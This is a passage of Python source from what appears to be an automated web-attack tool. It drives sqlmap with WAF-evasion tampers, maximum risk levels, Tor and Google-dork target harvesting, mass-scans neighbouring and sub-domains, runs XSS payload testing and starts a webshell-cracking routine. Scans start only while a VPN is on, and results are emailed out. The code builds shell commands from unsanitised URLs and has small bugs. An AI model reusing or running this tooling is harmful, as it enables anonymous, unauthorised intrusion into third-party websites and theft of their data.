        tor_sqlmap_string = sqlmap_string + " --tor --tor-type=socks5 --check-tor"
        tor_forms_sqlmap_string = tor_sqlmap_string + " -forms"

        # print("sqlmap_string is:%s" % sqlmap_string)
        # sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5
        # --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php
        # tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php
        # cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php
        # idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php
        # cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php
        # CategoryID="|"php action="|"php newsID="|"php newsid="|"php
        # product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")
        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                subject="ssqqll")

    else:
        fp = open(http_url_or_file, "r+")
        all_urls = fp.readlines()
        fp.close()
        for each in all_urls:
            domain_url = each[7:] if re.match("(http://)", each) else each[8:]
            sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 1 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % (
                domain_url, each)
            forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay 1 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE --forms''' % (
                domain_url, each)
            tor_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 1 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 risk 3 --ignore-code 404 --technique=BE''' % (
                domain_url, each)
            tor_forms_sqlmap_string = '''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp|aspx|jsp" --delay 1 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE --forms''' % (
                domain_url, each)
            # print("sqlmap_string is:%s" % sqlmap_string)
            # sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5
            # --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php
            # tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php
            # cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php
            # idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php
            # cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php
            # CategoryID="|"php action="|"php newsID="|"php newsid="|"php
            # product_id="|"php cat="|"php parent_id="|"php view="|"php
            # itemid="'''
            if not tor_or_not:
                print("sqlmap_string is:%s" % sqlmap_string)
                print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")
            elif tor_or_not:
                print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                print(
                    "tor_forms_sqlmap_string is:%s" %
                    tor_forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                tor_forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            sqlmap_result = get_sqlmap_result_and_save_result(each)
            if sqlmap_result != "":
                mail_msg_to(
                    sqlmap_result,
                    subject="ssqqll")


def sqlmap_crawl(origin_http_url_or_file, tor_or_not, post_or_not):
    # this function use sqlmap's "--crawl" option to find sqli urls.
    global DELAY

    if os.path.exists("/usr/share/sqlmap/sqlmap.py") and os.path.exists("/usr/share/sqlmap/.git"):
        os.system("cd /usr/share/sqlmap/ && git pull")
    else:
        os.system("cd /usr/share/ && rm -r sqlmap && git clone https://github.com/sqlmapproject/sqlmap")

    if DELAY=="":
        DELAY = 1

    if re.match("(http://)|(https://)", origin_http_url_or_file):
        origin_http_url = re.sub(r'(\s)$', "", origin_http_url_or_file)
        http_netloc = get_http_netloc_from_url(origin_http_url)
        cookie = get_url_cookie(origin_http_url_or_file)
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=5 --crawl-exclude "(logout)|(logoff)|(exit)|(signout)|(signoff)" --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % (
            origin_http_url, DELAY, origin_http_url)
        sqlmap_string = sqlmap_string if cookie == "" else sqlmap_string + \
            " --cookie='%s'" % cookie

        forms_sqlmap_string = sqlmap_string + " --forms"
        tor_sqlmap_string = sqlmap_string + " --tor --tor-type=socks5 --check-tor"
        tor_forms_sqlmap_string = tor_sqlmap_string + " -forms"
        # print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            #print("sqlmap_string is:%s" % sqlmap_string)
            #print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(
            origin_http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                subject="ssqqll")

    else:
        fp = open(origin_http_url_or_file, "r+")
        all_urls = fp.readlines()
        fp.close()
        for each in all_urls:
            origin_http_url = re.sub(r'(\s)$', "", each)
            http_netloc = get_http_netloc_from_url(origin_http_url)
            cookie = get_url_cookie(origin_http_url_or_file)
            sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=5 --crawl-exclude "(logout)|(logoff)|(exit)|(signout)|(signoff)" --delay %d --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % (
                origin_http_url, DELAY, origin_http_url)
            sqlmap_string = sqlmap_string if cookie == "" else sqlmap_string + \
                " --cookie='%s'" % cookie
            forms_sqlmap_string = sqlmap_string + " --forms"
            tor_sqlmap_string = sqlmap_string + " --tor --tor-type=socks5 --check-tor"
            tor_forms_sqlmap_string = tor_sqlmap_string + " -forms"

            # print("sqlmap_string is %s" % sqlmap_string)
            if not tor_or_not:
                print("sqlmap_string is:%s" % sqlmap_string)
                print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            elif tor_or_not:
                print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                print(
                    "tor_forms_sqlmap_string is:%s" %
                    tor_forms_sqlmap_string)
                while 1:
                    if checkvpn():
                        os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                        if post_or_not:
                            os.system(
                                "/usr/bin/python2.7 %s" %
                                tor_forms_sqlmap_string)
                        break
                    else:
                        time.sleep(1)
                        print("vpn is off,scan will continue till vpn is on")

            sqlmap_result = get_sqlmap_result_and_save_result(each)
            if sqlmap_result != "":
                mail_msg_to(
                    sqlmap_result,
                    subject="ssqqll")


def sqlmap_g_human(http_url_or_file, tor_or_not, post_or_not):
    # this function use myGoogleScraper to search google dork to get the full
    # urls,in this mode,we need input the yanzhengma by human,not robot,coz
    # sqlmap's -g option can only get the former 100 results,this function will
    # get almost the all results.

    global DELAY

    if DELAY=="":
        DELAY = 1

    if re.match("(http://)|(https://)", http_url_or_file):
        http_url_or_file = re.sub(r"\s$", "", http_url_or_file)
        domain_url = http_url_or_file[7:] if re.match(
            "(http://)", http_url_or_file) else http_url_or_file[8:]
        query = '''site:%s inurl:php|asp|aspx|jsp''' % domain_url
        # import easy_search
        # search_url_list=blew expression
        # easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
        os.system('''~/myenv/bin/python3.5 easy_search.py "%s"''' % query)
        # here myenv/python3.5 is the selenium changed version

        http_netloc = get_http_netloc_from_url(http_url_or_file)
        cookie = get_url_cookie(http_url_or_file)
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % DELAY
        sqlmap_string = sqlmap_string if cookie == "" else sqlmap_string + \
            " --cookie='%s'" % cookie
        forms_sqlmap_string = sqlmap_string + " --forms"
        tor_sqlmap_string = sqlmap_string + " --tor --tor-type=socks5 --check-tor"
        tor_forms_sqlmap_string = tor_sqlmap_string + " -forms"

        # print("sqlmap_string is:%s" % sqlmap_string)
        if not tor_or_not:
            print("sqlmap_string is:%s" % sqlmap_string)
            print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        elif tor_or_not:
            print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
            print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
            while 1:
                if checkvpn():
                    os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
                    if post_or_not:
                        os.system(
                            "/usr/bin/python2.7 %s" %
                            tor_forms_sqlmap_string)
                    break
                else:
                    time.sleep(1)
                    print("vpn is off,scan will continue till vpn is on")

        sqlmap_result = get_sqlmap_result_and_save_result(http_url_or_file)
        if sqlmap_result != "":
            mail_msg_to(
                sqlmap_result,
                subject="ssqqll")

    else:
        try:
            fp = open(http_url_or_file, "r+")
            all_urls = fp.readlines()
            # print("open file 666666")
            print(all_urls)
            fp.close()
            for each in all_urls:
                domain_url = each[7:] if re.match(
                    "(http://)", each) else each[8:]
                print(domain_url)
                query = '''site:%s inurl:php|asp|aspx|jsp''' % domain_url
                # import easy_search
                # search_url_list=blew expression
                # easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
                if os.path.exists('GoogleScraper_origin_http_domain_url_list.txt'):
                    os.system(
                        "rm GoogleScraper_origin_http_domain_url_list.txt")
                os.system(
                    '''~/myenv/bin/python3.5 easy_search.py "%s"''' %
                    query)  # here myenv/python3.5 is the selenium changed version

                http_netloc = get_http_netloc_from_url(each)
                cookie = get_url_cookie(http_url_or_file)
                sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay %d --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % DELAY
                sqlmap_string = sqlmap_string if cookie == "" else sqlmap_string + \
                    " --cookie='%s'" % cookie
                forms_sqlmap_string = sqlmap_string + " --forms"
                tor_sqlmap_string = sqlmap_string + " --tor --tor-type=socks5 --check-tor"
                tor_forms_sqlmap_string = tor_sqlmap_string + " -forms"

                # print("sqlmap_string is:%s" % sqlmap_string)
                if not tor_or_not:
                    print("sqlmap_string is:%s" % sqlmap_string)
                    print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
                    while 1:
                        if checkvpn():
                            os.system("/usr/bin/python2.7 %s" % sqlmap_string)
                            if post_or_not:
                                os.system(
                                    "/usr/bin/python2.7 %s" %
                                    forms_sqlmap_string)
                            break
                        else:
                            time.sleep(1)
                            print("vpn is off,scan will continue till vpn is on")

                elif tor_or_not:
                    print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
                    print(
                        "tor_forms_sqlmap_string is:%s" %
                        tor_forms_sqlmap_string)
                    while 1:
                        if checkvpn():
                            os.system("/usr/bin/python2.7 %s" %
                                      tor_sqlmap_string)
                            if post_or_not:
                                os.system(
                                    "/usr/bin/python2.7 %s" %
                                    tor_forms_sqlmap_string)
                            break
                        else:
                            time.sleep(1)
                            print("vpn is off,scan will continue till vpn is on")

                for each in all_urls:
                    sqlmap_result = get_sqlmap_result_and_save_result(each)
                    if sqlmap_result != "":
                        mail_msg_to(sqlmap_result, subject="ssqqll")

        except:
            print("open file error")


def sqli_scan(start_url):
    # 根据SCAN_WAY而采取相应的扫描sqli模式
    # target要求是http...格式,不能是纯domain
    global DB_NAME
    global SCAN_WAY
    target=get_http_domain_from_url(start_url)

    http_domain = target
    main_target_table_name = get_main_target_table_name(http_domain)


    http_domain_sqli_scaned = get_scan_finished(
        "sqli_scaned",DB_NAME,
        main_target_table_name,"start_url",start_url)

    pang_domains_sqli_scaned = get_scan_finished(
        "pang_domains_sqli_scaned",
        DB_NAME,
        main_target_table_name,
        "start_url",
        start_url)
    sub_domains_sqli_scaned = get_scan_finished(
        "sub_domains_sqli_scaned",
        DB_NAME,
        main_target_table_name,
        "start_url",
        start_url)
    if SCAN_WAY == 1 and http_domain_sqli_scaned == 1 and pang_domains_sqli_scaned == 1:
        return
    if SCAN_WAY==2 and http_domain_sqli_scaned == 1 and sub_domains_sqli_scaned == 1:
        return
    if SCAN_WAY == 3 and http_domain_sqli_scaned == 1 and pang_domains_sqli_scaned == 1 and sub_domains_sqli_scaned == 1:
        return
    if SCAN_WAY == 4 and http_domain_sqli_scaned == 1:
        return

    print(
        '''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
is not a good idea to use tor,but when your targets has waf,use tor is better.
input Y(y) or N(n) default [N]''', end='')
    choose_tor = get_input_intime('n', 5)
    if choose_tor == 'Y' or choose_tor == 'y':
        bool_tor = True
    else:
        bool_tor = False

    print(
        '''input 'y' to use sqlmap auto find forms,input 'n' for not,
input Y(y) or N(n) default [Y]''', end='')
    choose_post = get_input_intime('y', 5)
    if choose_post == 'Y' or choose_post == 'y':
        post_or_not = True
    else:
        post_or_not = False

    print('''there are two kinds of sqli blew:
1.use "sqlmap_crawl"
2.use "sqlmap-g-nohuman"
input your number here''', end='')
    num = str(get_input_intime(1, 5))
    if num == str(1):
        while(1):
            if checkvpn():
                if http_domain_sqli_scaned == 0 or pang_domains_sqli_scaned == 0 or sub_domains_sqli_scaned == 0:
                    # 不管SCAN_WAY的值为多少,首先对main target进行sqli扫描
                    if http_domain_sqli_scaned == 0:
                        sqlmap_crawl(start_url, bool_tor, post_or_not)
                        set_scan_finished("sqli_scaned",DB_NAME,main_target_table_name, "start_url",start_url)

                    domain_pang_file = LOG_FOLDER_PATH + "/pang/%s_pang.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_pang_table_name = http_domain.split(
                        '/')[-1].replace(".", "_") + "_pang"
                    http_sub_domain_file = LOG_FOLDER_PATH + "/sub/%s_sub.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_sub_table_name = http_domain.split(
                        '/')[-1].replace(".", "_") + "_sub"

                    if SCAN_WAY == 1:
                        # 1和3的扫描方式中要扫描旁站,此时对旁站进行sqli扫描
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned",DB_NAME, domain_pang_table_name, "http_domain",pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在子站表中查询是否当前旁站也是子站,如果是且在上次子站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在旁站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", pang_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this pang domain is the same to one sub domain whose sqli scan finished in sub domain table")
                                        else:
                                            sqlmap_crawl(
                                                pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished("sqli_scaned",DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)
                    elif SCAN_WAY== 2:
                        with open(http_sub_domain_file, "r+") as f:
                            http_sub_domain_list = f.readlines()
                            for http_sub_domain in http_sub_domain_list:
                                http_sub_domain_value = re.sub(
                                    r"(\s)$", "", http_sub_domain)
                                if http_sub_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned",DB_NAME,domain_sub_table_name,"http_domain", http_sub_domain_value)
                                    if sqli_scaned == 0:
                                        # 在旁站表中查询是否当前子站也是旁站,如果是且在上次旁站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在子站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned",DB_NAME, domain_pang_table_name,"http_domain", http_sub_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this sub domain is the same to one pang domain whose sqli scan finished in pang domain table")
                                        else:
                                            sqlmap_crawl(
                                                http_sub_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned",DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)

                    elif SCAN_WAY== 3:
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned",DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        # 在子站表中查询是否当前旁站也是子站,如果是且在上次子站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在旁站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned",DB_NAME, domain_sub_table_name,"http_domain", pang_http_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this pang domain is the same to one sub domain whose sqli scan finished in sub domain table")
                                        else:
                                            sqlmap_crawl(
                                                pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned",DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)

                        with open(http_sub_domain_file, "r+") as f:
                            http_sub_domain_list = f.readlines()
                            for http_sub_domain in http_sub_domain_list:
                                http_sub_domain_value = re.sub(
                                    r"(\s)$", "", http_sub_domain)
                                if http_sub_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                                    if sqli_scaned == 0:
                                        # 在旁站表中查询是否当前子站也是旁站,如果是且在上次旁站扫描中已经扫描过
                                        # 那么此次不再重复sqli扫描,并在子站表中将sqli_scaned标记为1
                                        sqli_scaned = get_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_pang_table_name,"http_domain",
                                            http_sub_domain_value)
                                        if sqli_scaned == 1:
                                            print(
                                                "this sub domain is the same to one pang domain whose sqli scan finished in pang domain table")
                                        else:
                                            sqlmap_crawl(
                                                http_sub_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)

                    elif SCAN_WAY== 4:
                        pass
                    else:
                        print("SCAN_WAY error,check it")

                    break

                else:
                    print(
                        "it seems that one main target's sqli_scaned value you get is not what you want")
            else:
                time.sleep(1)
                print("vpn is off,scan will continue till vpn is on")

    if num == str(2):
        while(1):
            if checkvpn():

                if http_domain_sqli_scaned == 0 or pang_domains_sqli_scaned == 0 or sub_domains_sqli_scaned == 0:
                    # 不管SCAN_WAY的值为多少,首先对main target进行sqli扫描
                    if http_domain_sqli_scaned == 0:
                        sqlmap_g_nohuman(
                            http_domain, bool_tor, post_or_not)
                        set_scan_finished("sqli_scaned", DB_NAME,
                                          main_target_table_name,"start_url",start_url)

                    domain_pang_file = LOG_FOLDER_PATH + "/pang/%s_pang.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_pang_table_name = http_domain.split(
                        '/')[-1].replace(".", "_") + "_pang"
                    http_sub_domain_file= LOG_FOLDER_PATH + "/sub/%s_sub.txt" % http_domain.split(
                        '/')[-1].replace(".", "_")
                    domain_sub_table_name = http_domain.split(
                        '/')[-1].replace(".", "_") + "_sub"

                    if SCAN_WAY== 1:
                        # 1和3的扫描方式中要扫描旁站,此时对旁站进行sqli扫描
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)
                    elif SCAN_WAY== 2:
                        with open(http_sub_domain_file, "r+") as f:
                            http_sub_domain_list = f.readlines()
                            for http_sub_domain in http_sub_domain_list:
                                http_sub_domain_value = re.sub(
                                    r"(\s)$", "", http_sub_domain)
                                if http_sub_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            http_sub_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)

                    elif SCAN_WAY== 3:
                        with open(domain_pang_file, "r+") as f:
                            domain_pang_list = f.readlines()
                            for pang_http_domain in domain_pang_list:
                                pang_http_domain_value = re.sub(
                                    r"(\s)$", "", pang_http_domain)
                                if pang_http_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            pang_http_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_pang_table_name,"http_domain", pang_http_domain_value)
                            set_scan_finished(
                                "pang_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)
                        with open(http_sub_domain_file, "r+") as f:
                            http_sub_domain_list = f.readlines()
                            for http_sub_domain in http_sub_domain_list:
                                http_sub_domain_value = re.sub(
                                    r"(\s)$", "", http_sub_domain)
                                if http_sub_domain_value != http_domain:
                                    sqli_scaned = get_scan_finished(
                                        "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain" ,http_sub_domain_value)
                                    if sqli_scaned == 0:
                                        sqlmap_g_nohuman(
                                            http_sub_domain_value, bool_tor, post_or_not)
                                        set_scan_finished(
                                            "sqli_scaned", DB_NAME, domain_sub_table_name,"http_domain", http_sub_domain_value)
                            set_scan_finished(
                                "sub_domains_sqli_scaned",
                                DB_NAME,
                                main_target_table_name,
                                "start_url",
                                start_url)

                    elif SCAN_WAY== 4:
                        pass
                    else:
                        print("SCAN_WAY error,check it")

                    break

                else:
                    print(
                        "it seems that one main target's sqli_scaned value you get is not what you want")
            else:
                time.sleep(1)
                print("vpn is off,scan will continue till vpn is on")


def single_xss_scan(start_url):
    # 这里进行xss漏洞检测
    # target可以是主要目标或是主要目标的旁站或子站
    global DB_NAME
    
    target=get_http_domain_from_url(start_url)
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"

    
    if target[:4] != "http":
        print("error,target should be like http(s)://xxx.xxx.xxx")
        return

    if not os.path.exists(WORK_PATH+"/xssfork"):
        #准备xssfork
        os.system("cd %s && git clone https://github.com/bsmali4/xssfork.git" % WORK_PATH) 
        os.system("cd %s && pip2 install -r requirements.txt" % WORK_PATH)
    def xss_check(url):
        #对url进行xss检测
        #包括存储型xss,自动化检测存储型xss时暂只检测输出内容的目标url为当前url的情况
        if get_url_has_csrf_token(url)['hasCsrfToken']:
            return "url has csrf token,I cann't check xss in this situation,you should check it in your new code"
        if not re.search(r"(\?|\^)\w+=",url):
            #如果没有参数则不进行检测
            return
        http_netloc = get_http_netloc_from_url(url)
        cookie = get_url_cookie(start_url)
        content=""
        if "^" not in url:
            #get请求
            xss_cmd='''python2 %s/xssfork.py -u "%s" --cookie "%s" 2>&1 | tee /tmp/xssfork''' % (WORK_PATH,url,cookie)
            os.system(xss_cmd)
            with open("/tmp/xssfork","r+") as f:
                content=f.read()
            os.system("rm /tmp/xssfork")
            if re.search(r"PAYLOAD",content,re.I):
                return conten+"\n"
            return content
        else:
            #post请求
            urlList=url.split("^")
            url=urlList[0]
            data=urlList[1]
            xss_cmd='''python2 %s/xssfork.py -u "%s" --cookie "%s" --data "%s" 2>&1 | tee /tmp/xssfork''' % (WORK_PATH,url,cookie,data)
            os.system(xss_cmd)
            with open("/tmp/xssfork","r+") as f:
                content=f.read()
            os.system("rm /tmp/xssfork")
            if re.search(r"PAYLOAD",content,re.I):
                return content+"\n"
            return content

    target_urls_list=get_target_urls_from_db(target)
    strings_to_write=""

    table_name_list = get_target_table_name_list(target)
    if 1 == get_scan_finished(
        "xss_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            start_url):
        return
    else:
        for eachUrl in target_urls_list:
            strings_to_write+=xss_check(eachUrl)

    for each_table in table_name_list:
        if strings_to_write!="":
            execute_sql_in_db(
                "update `%s` set xsss='%s' where %s='%s'" %
                (each_table, strings_to_write,column_name, start_url), DB_NAME)


def getServerType(url):
    # 得到url对应web服务器的类型,eg.apache,iis,nginx,lighttpd
    # phpstudy中试验上面4种的php默认post参数最大个数为1000个
    import requests
    r = requests.get(url)
    serverType = r.headers['server']
    apachePattern = re.compile(r"apache", re.I)
    iisPattern = re.compile(r"iis", re.I)
    nginxPattern = re.compile(r"nginx", re.I)
    lighttpdPattern = re.compile(r"lighttpd", re.I)
    '''
    if re.search(apachePattern,serverType):
        return "apache"
    elif re.search(iisPattern,serverType):
        return "iis"
    elif re.search(nginxPattern,serverType):
        return "nginx"
    elif re.search(lighttpdPattern,serverType):
        return "lighttpd"
    '''
    return serverType


def single_crack_webshell_scan(target):


    global DB_NAME
    table_name_list = get_target_table_name_list(target)
    target_urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    # regexp是大小写都匹配的,要强制只匹配大写或小写,要写成regexp binary '....'
    result = execute_sql_in_db(
        "select url from `%s` where url regexp '^http.*\.((php)|(asp)|(aspx)|(jsp))$'" %
